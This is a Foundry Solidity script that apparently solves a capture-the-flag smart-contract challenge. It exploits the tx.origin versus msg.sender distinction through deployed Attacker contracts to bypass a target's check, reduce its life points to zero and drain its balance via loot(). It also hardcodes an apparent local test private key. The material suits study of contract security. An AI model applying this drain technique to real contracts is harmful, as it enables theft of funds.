// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/Attacker.sol";

contract SolveScript is Script {
    function run() public {
        // (address heker, uint256 key) = makeAddrAndKey("heker");
        (address heker, uint256 key) = (0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
        vm.startBroadcast(key);
        address setup_addr = vm.envAddress("SETUP_ADDR");
        Setup s = Setup(setup_addr);
        Creature target = Creature(s.TARGET());
        Attacker attacker = new Attacker(address(target));
        Attacker baiter = new Attacker(address(target));

        console.log("address(this): %s", address(this));
        console.log("address(heker): %s", heker);
        console.log("address(target): %s", address(target));
        console.log("address(attacker): %s", address(attacker));

        // heker is tx.origin and msg.sender
        console.log("target.debugTxOrigin: %s", target.debugTxOrigin());
        console.log("target.debugMsgSender: %s", target.debugMsgSender());
        assert(target.debugTxOrigin() == heker);
        assert(target.debugMsgSender() == heker);
        assert(target.isOffBalance() == false);

        // heker is tx.origin and attacker is msg.sender
        console.log("attacker.debugTxOrigin: %s", attacker.debugTxOrigin());
        console.log("attacker.debugMsgSender: %s", attacker.debugMsgSender());
        assert(attacker.debugTxOrigin() == heker);
        assert(attacker.debugMsgSender() == address(attacker));
        assert(attacker.isOffBalance() == true);

        assert(target.aggro() == address(0));
        baiter.attack(1);
        console.log("TARGET aggro has switched to baiter");
        assert(target.aggro() == address(baiter));

        console.log("TARGET.lifePoints: %d", target.lifePoints());
        attacker.attack(target.lifePoints());
        console.log("TARGET.lifePoints: %d", target.lifePoints());
        assert(target.lifePoints() == 0);

        console.log("heker balance: %d", heker.balance);
        console.log("TARGET balance: %d", address(target).balance);
        target.loot();
        console.log("TARGET balance: %d", address(target).balance);
        console.log("heker balance: %d", heker.balance);

        assert(s.isSolved() == true);
        console.log("Solved!");

        vm.stopBroadcast();
    }
}
